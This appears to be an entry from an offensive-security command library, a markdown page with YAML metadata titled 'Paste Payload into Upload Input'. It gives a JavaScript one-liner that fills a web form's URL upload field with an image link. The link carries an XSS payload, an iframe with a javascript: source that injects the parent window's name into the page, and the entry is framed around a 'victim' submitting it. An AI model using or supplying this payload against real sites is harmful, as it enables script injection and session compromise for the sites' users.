---
id: cmd-paste-upload-payload
data: >-
  document.querySelector('input[type="url"]').value =
  'https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg?<<iframe/src=javascript:self.innerHTML=parent.name>img/src=x>';
  // Then submit
tags:
  - paste-payload
  - xss-trigger
type: command
output: Input filled; XSS on submit
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:13.009Z'
verified: false
validated: true
submitted: true
---
# Paste Payload into Upload Input

## Command

```javascript
document.querySelector('input[type="url"]').value = 'https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg?<<iframe/src=javascript:self.innerHTML=parent.name>img/src=x>'; // Then submit
```

## Description

Fills upload input with payload; submission triggers XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| value | Payload URL | Yes |

## Examples

### Basic Usage

```javascript
// Victim pastes/submits
```

## Expected Output

DOM manipulation on submit.

## Related

- [[Related Procedure: Trigger DOM-based Self-XSS]]
